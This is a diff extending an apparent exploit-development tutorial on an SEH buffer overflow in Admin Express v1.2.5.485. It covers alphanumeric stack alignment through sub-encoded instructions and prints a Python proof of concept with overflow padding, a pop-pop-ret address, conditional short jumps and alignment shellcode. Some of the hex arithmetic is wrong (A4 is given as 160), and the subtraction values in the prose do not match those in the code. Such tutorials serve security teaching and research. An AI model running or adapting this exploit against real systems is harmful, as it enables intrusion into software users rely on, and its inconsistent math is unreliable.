@@ -308,8 +308,145 @@ What we will need to do now, is some math to get our stack aligned. We will need
 
 Break out your hexadecimal calculators. Make sure your calculator is configured to __DWORD__. The [Windows Caclulator](https://github.com/microsoft/calculator) is a very good one.
 
-If you subtract the two values above you will get:
+If you subtract the two values above you will get a difference of:
 
 ```console
 FF FF E8 A4
+```
+
+You will notice I do this differently later on. For memory addresses, I do not flip any of the bytes. This is because it helps me, with a mental note. This does not make sense now, but later it will. When I do hexadecimal math for alphanumeric encoding of instructions that will form opcodes, I flip the bits so I can use [little endian](https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html) format in the end. It is just a mental thing for me that I use to keep everything straight. You can do as you please.
+
+Carrying on- we need to list the bits in vertical order:
+
+```console
+FF
+FF
+E8
+A4
+```
+
+Next, convert the bits to decimal numbers:
+
+```console
+FF = 255
+FF = 255
+E8 = 232
+A4 = 160
+```
+
+This hexadecimal method of alphanumeric shellcoding will require 3 values. Essentially what we are going to do is:
+1. Zero out the `EAX` register
+2. Subtract three values from `EAX`
+3. Push the new value of `EAX` onto the stack.
+
+Whenever those three values are subtracted from the `EAX` register, that has been zeroed out, the result will be the opcodes we want to execute! What we need to do next, is find three values that equal each of those four numbers above! These three numbers can be any of the numbers allowed within our characer set. Let me give an example. if we have a value of 15, you don't have to use `5, 5, 5`. You could use `13, 1, 1` or `6, 7, 2`. Use whatever you would like! So let's do this for each:
+
+```console
+255 = 85 + 85 + 85
+255 = 85 + 85 + 85
+232 = 77 + 77 + 78
+160 = 54 + 54 + 56
+```
+
+Awesome! Just one more step now! Take each of those three numbers in each row, and convert them into hexadecimal! For the below snippet, each hexadecimal number is in parentheses:
+
+```console
+255 = 85(55) + 85 (55) + 85(55)
+255 = 85(55) + 85 (55) + 85(55)
+232 = 77(4D) + 77(4D) + 78(4E)
+160 = 54(36) + 54(36) + 56(38)
+```
+
+Starting with the bottom row, we need to take each hexadecimal value and write it going up the columns! For instance, here is the first value:
+
+```console
+255 = 85(55) + 85 (55) + 85(55)
+255 = 85(55) + 85 (55) + 85(55)
+232 = 78(4E) + 77 (4D) + 77(4D)
+160 = 54(36) + 54 (36) + 56(38)
+_______________________________
+384E5555
+```
+
+The second value is:
+
+```console
+255 = 85(55) + 85 (55) + 85(55)
+255 = 85(55) + 85 (55) + 85(55)
+232 = 78(4E) + 77 (4D) + 77(4D)
+160 = 54(36) + 54 (36) + 56(38)
+_______________________________
+384E5555    364D5555
+```
+
+The last value is:
+
+```console
+255 = 85(55) + 85 (55) + 85(55)
+255 = 85(55) + 85 (55) + 85(55)
+232 = 78(4E) + 77 (4D) + 77(4D)
+160 = 54(36) + 54 (36) + 56(38)
+_______________________________
+384E5555    364D5555    364D5555
+```
+
+Our three values are: `364D5555`, `364D5555`, `384E5555`. Whenever you do this math, it change the stack pointer value to `0012F3F4`. Before we do this math though, we will execute a few instructions. They are:
+1. `push esp` - to get the value of the current stack pointer on the stack.
+2. `pop eax` - to pop the stack pointer value into `EAX`.
+
+After these instructions, we begin commencment of our subtraction math. After the subtraction math, we will then execute a few more instructions. They are:
+1. `push eax` - `EAX` contains the value of the `0012F3F4`, which is where we want our stack pointer value to be, since we will be writing our shellcode up the stack, to lower memory addresses.
+2. `pop esp` - this will pop the value of `EAX` (`0012F3F4`) into the stack pointer.
+
+After all of these instructions are executed, we can begin writing our shellcode to the stack! Here is the updated PoC, at this point:
+
+```console
+root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
+# Proof of Concept - Admin Express v1.2.5.485 Exploit
+
+payload = "\x41" * 4260
+payload += "\x70\x7e\x71\x7e"		# JO 126 bytes. If jump fails, default to JNO 126 bytes
+payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
+
+# We need to save the current stack pointer before execution of shellcode, due to
+# old stack pointer value needed when executing our payload of calc.exe. This puts the current stack pointer 0x0012DC98 into ECX, to be used later
+restore = "\x54" 			# push esp; (pushing the current value of ESP, which needs to be restored later, onto the stack)
+restore += "\x59" 			# pop ecx; (holding the value of old ESP in ECX, to be called later.)
+restore += "\x51" 			# push ecx; (to get the value on the stack for the mov esp command later)
+
+# Stack alignment
+# Need to make ESP 0x012F3F4. Using sub method to write that value onto the stack.
+# After making ESP 0x012F3F4, it should be the same value as EAX- so we can write up the stack.
+alignment = "\x54" # push esp
+alignment += "\x58" # pop eax; (puts the value of ESP into EAX)
+
+# Write these 3 sub values in normal format, since memory address, not instruction to be executed. You do not have to do
+# it this way, but I do my calculations in normal format to remind me it is a memory address, when doing hex max. For my
+# other operations, I used little endian. If you do all of the calculations in one way, you do not need to flip the sub
+# math difference results. This is how I keep things straight
+# 384D5555 364D5555 364E5555
+alignment += "\x2d\x38\x4d\x55\x55" # sub eax, 0x384D5555
+alignment += "\x2d\x36\x4d\x55\x55" # sub eax, 0x364D5555
+alignment += "\x2d\x36\x4e\x55\x55" # sub eax, 0x364E5555
+alignment += "\x50" # push eax
+alignment += "\x5c" # pop esp; (puts the value of eax back into esp)
+
+# There are 2 NULL (\x00) terminators in our buffer of A's, near our nSEH jump. We are going to jump far away from them
+# so we have enough room for our shellcode and to decode.
+payload += "\x41" * 122			# add padding since we jumped 7e hex bytes (126 bytes) above
+payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x41" * 124
+payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x41" * 124
+payload += "\x70\x79\x71\x79"		# JO or JNO only 121 bytes
+payload += "\x41" * 121			# NOP is in the restricted characters. Using \x41 as a slide into alignment
+payload += restore
+payload += "\x43" * (5000-len(payload))
+
+
+print payload
+
+#f = open('pwn.txt', 'w')
+#f.write(payload)
+#f.close()
 ```
